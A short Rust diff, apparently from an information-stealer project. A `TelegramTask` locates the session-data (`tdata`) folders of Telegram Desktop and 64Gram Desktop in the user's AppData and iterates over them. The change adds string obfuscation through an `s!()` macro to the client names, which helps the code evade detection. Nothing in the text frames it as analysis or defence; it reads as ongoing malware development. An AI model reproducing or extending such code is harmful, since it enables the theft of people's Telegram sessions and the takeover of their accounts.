@@ -10,8 +10,8 @@ impl Task for TelegramTask {
     unsafe fn run(&self, parent: &Path) {
         let appdata = &Path::appdata();
         let paths = [
-            ("Telegram Desktop", appdata / s!("Telegram Desktop") / s!("tdata")),
-            ("64Gram Desktop", appdata / s!("64Gram Desktop") / s!("tdata")),
+            (s!("Telegram Desktop").to_owned(), appdata / s!("Telegram Desktop") / s!("tdata")),
+            (s!("64Gram Desktop").to_owned(), appdata / s!("64Gram Desktop") / s!("tdata")),
         ];
         
         for (client, tdata_path) in paths {
